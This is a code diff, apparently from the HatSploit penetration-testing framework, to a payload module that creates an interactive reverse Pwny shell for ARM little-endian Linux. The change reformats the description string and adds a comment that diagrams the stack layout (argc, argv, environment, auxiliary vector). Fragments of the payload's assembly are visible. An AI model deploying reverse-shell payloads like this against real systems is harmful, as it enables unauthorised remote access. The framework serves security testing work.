@@ -22,10 +22,10 @@ class HatSploitPayload(Payload, Handler):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload creates an interactive reverse Pwny shell for Linux "
-                "with ARM little-endian architecture."
-            ),
+            'Description': """
+                This payload creates an interactive reverse Pwny shell for Linux
+                with ARM little-endian architecture.
+            """,
             'Arch': ARCH_ARMLE,
             'Platform': OS_LINUX,
             'Session': PwnySession,
@@ -56,6 +56,32 @@ class HatSploitPayload(Payload, Handler):
                 mov r3, 0x100
                 ldr r7, =291
                 svc 0
+
+            #################################################
+            ##
+            ##    +----------------------------------+ low
+            ##    |              ARGC                |
+            ##    |----------------------------------|
+            ##    |           ARGV[0] = p            |
+            ##    |----------------------------------|
+            ##    |         ARGV[1] = sock           |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ARGV)         |
+            ##    |----------------------------------|
+            ##    |          ENV strings             |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ENV)          |
+            ##    |----------------------------------|
+            ##    |           AT_BASE (7)            |
+            ##    |----------------------------------|
+            ##    |   address of pwny binary image   |
+            ##    |----------------------------------|
+            ##    |           AT_NULL (0)            |
+            ##    |----------------------------------|
+            ##    |         NULL (ends AUXV)         |
+            ##    +----------------------------------+ high
+            ##
+            #################################################
 
                 sub sp, 16
                 add sp, 36 + 4
